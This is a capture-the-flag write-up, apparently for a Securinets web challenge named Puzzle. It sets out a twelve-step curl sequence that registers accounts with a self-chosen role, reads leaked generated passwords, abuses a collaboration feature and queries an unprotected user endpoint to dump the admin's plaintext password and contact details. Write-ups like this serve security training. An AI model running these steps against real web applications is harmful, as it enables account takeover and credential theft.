# Solve Timeline: Puzzle Collaboration Exploit

## Step 1: Create an Editor User
Create a new editor user with the following command:
```bash
curl -c editor_cookies.txt -X POST http://puzzle-c4d26ae9.p1.securinets.tn/confirm-register -d 'username=editor_final_final&email=editor_final_final@editor.com&role=1'
```
Response:
```json
{"redirect":"/home","success":true}
```

---

## Step 2: Retrieve the Editor Password
Log in as the editor user to retrieve the generated password:
```bash
curl -b editor_cookies.txt http://puzzle-c4d26ae9.p1.securinets.tn/home
```
Extracted password:
```plaintext
47Dg%jN3Cmel
```

---

## Step 3: Log in as the Editor User
Log in using the editor credentials:
```bash
curl -b editor_cookies.txt -X POST http://puzzle-c4d26ae9.p1.securinets.tn/login -d 'username=editor_final_final&password=47Dg%jN3Cmel'
```

---

## Step 4: Create a Regular User
Create a new regular user:
```bash
curl -c user_cookies.txt -X POST http://puzzle-c4d26ae9.p1.securinets.tn/confirm-register -d 'username=user_final_final&email=user_final_final@user.com&role=2'
```
Response:
```json
{"redirect":"/home","success":true}
```

---

## Step 5: Retrieve the Regular User Password
Log in as the regular user to retrieve the generated password:
```bash
curl -b user_cookies.txt http://puzzle-c4d26ae9.p1.securinets.tn/home
```
Extracted password:
```plaintext
ikWJ5#hBoDev
```

---

## Step 6: Publish an Article and Invite Admin
Publish an article and send a collaboration request to the admin:
```bash
curl -b user_cookies.txt -X POST http://puzzle-c4d26ae9.p1.securinets.tn/publish -d 'title=MySuperSecretArticle5&content=test&collaborator=admin'
```
Response:
```json
{"message":"Collaboration request sent"}
```

---

## Step 7: Retrieve the Collaboration Request UUID
Retrieve the `request_uuid` from the collaborations page:
```bash
curl -b user_cookies.txt http://puzzle-c4d26ae9.p1.securinets.tn/collaborations
```
Extracted `request_uuid`:
```plaintext
d9ac4c5b-09a1-4e88-91ea-6ab73685fb28
```

---

## Step 8: Log in as the Editor User Again
Log in as the editor user:
```bash
curl -b editor_cookies.txt -X POST http://puzzle-c4d26ae9.p1.securinets.tn/login -d 'username=editor_final_final&password=47Dg%jN3Cmel'
```

---

## Step 9: Accept the Collaboration Request
Accept the collaboration request using the `request_uuid`:
```bash
curl -b editor_cookies.txt -X POST http://puzzle-c4d26ae9.p1.securinets.tn/collab/accept/d9ac4c5b-09a1-4e88-91ea-6ab73685fb28
```
Response:
```json
{"message":"Collaboration accepted"}
```

---

## Step 10: Log in as the Regular User Again
Log in as the regular user:
```bash
curl -b user_cookies.txt -X POST http://puzzle-c4d26ae9.p1.securinets.tn/login -d 'username=user_final_final&password=ikWJ5#hBoDev'
```

---

## Step 11: Retrieve Article and UUIDs
Check the home page to view the article and extract UUIDs:
```bash
curl -b user_cookies.txt http://puzzle-c4d26ae9.p1.securinets.tn/home
```
Extracted UUIDs:
- **Author UUID**: `b0a9cc8f-a340-46b3-8bf1-f97d6e126855`
- **Collaborator UUID**: `a8ec97ad-e893-4d4e-8613-c23bfb14671b`

---

## Step 12: Retrieve Admin Credentials
Use the editor account to retrieve the admin's credentials:
```bash
curl -b editor_cookies.txt http://puzzle-c4d26ae9.p1.securinets.tn/users/a8ec97ad-e893-4d4e-8613-c23bfb14671b
```
Response:
```json
{
  "email": "admin@securinets.tn",
  "password": "Adm1nooooX333!123!!%",
  "phone_number": "77777777",
  "role": "0",
  "username": "admin",
  "uuid": "a8ec97ad-e893-4d4e-8613-c23bfb14671b"
}
```

---

### Summary
This timeline demonstrates how to exploit the collaboration feature to retrieve sensitive admin credentials by leveraging the editor account's access to user details.

